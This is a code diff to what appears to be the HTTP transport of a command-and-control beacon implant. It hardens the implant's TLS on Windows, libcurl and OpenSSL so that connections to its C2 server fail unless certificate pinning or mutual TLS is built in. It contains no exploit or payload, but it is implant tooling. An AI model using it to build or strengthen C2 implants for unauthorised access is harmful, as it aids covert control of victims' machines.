@@ -457,6 +457,15 @@ inline std::string http_request(
     std::string response_body;
     if (!g_ctx.ensure(cfg)) return "";
 
+    // FAIL CLOSED (A-2): HTTPS with NEITHER a certificate pin NOR mTLS
+    // compiled in has no way to authenticate the peer. Refuse to send
+    // instead of silently completing a TLS handshake with any server
+    // (full MITM). A real build always carries a pin (c2_config.h /
+    // beacon_auth.h), so this only fires on a misconfigured build.
+#if !BEACON_PIN_ENFORCED && !BEACON_MTLS_ENABLED
+    if (cfg.use_https) { g_ctx.cleanup(); return ""; }
+#endif
+
     DWORD flags = cfg.use_https ? WINHTTP_FLAG_SECURE : 0;
 
     // Opens a fresh request handle with timeouts and (for HTTPS) the
@@ -474,10 +483,13 @@ inline std::string http_request(
         if (!h) return nullptr;
         winhttp_dyn::WinHttpSetTimeoutsDynamic(h, 15000, 15000, 30000, 30000);
         if (cfg.use_https) {
+            // The PIN (enforced below) is what authenticates the peer, so
+            // the CA/CN relaxations only stop WinHTTP failing the handshake
+            // before our own digest check runs. CERT_DATE_INVALID is NOT
+            // relaxed (A-2): an expired pinned certificate is rejected.
             DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                             SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
-                            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
-                            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+                            SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
             winhttp_dyn::WinHttpSetOptionDynamic(h, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
         }
         return h;
@@ -828,10 +840,13 @@ inline std::string http_request(
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
 #else
-        // Self-signed C2 certificate: mirror the Windows/Linux behaviour
-        // (the payload is additionally AES-GCM encrypted end-to-end).
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+        // FAIL CLOSED (A-3): no pin and no mTLS means libcurl cannot
+        // authenticate the peer. An impossible pin plus full verification
+        // makes every request fail until the build is re-pinned with the
+        // real certificate's key, instead of silently trusting anyone.
+        curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, "sha256//AAAA");
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
 #endif
     }
 
@@ -1122,6 +1137,14 @@ inline std::string http_request(
         OpenSSL_add_all_algorithms();
         ssl_ctx = SSL_CTX_new(TLS_client_method());
         if (ssl_ctx) {
+#if !BEACON_PIN_ENFORCED && !BEACON_MTLS_ENABLED
+            // FAIL CLOSED (A-2/A-3): with neither a pin nor mTLS nothing
+            // verifies the peer, so never hand a TLS session to an
+            // unauthenticated server. Refuse rather than trust anyone.
+            SSL_CTX_free(ssl_ctx);
+            close(sock);
+            return "";
+#endif
 #if BEACON_MTLS_ENABLED
             if (!configure_mtls(ssl_ctx)) {
                 SSL_CTX_free(ssl_ctx);
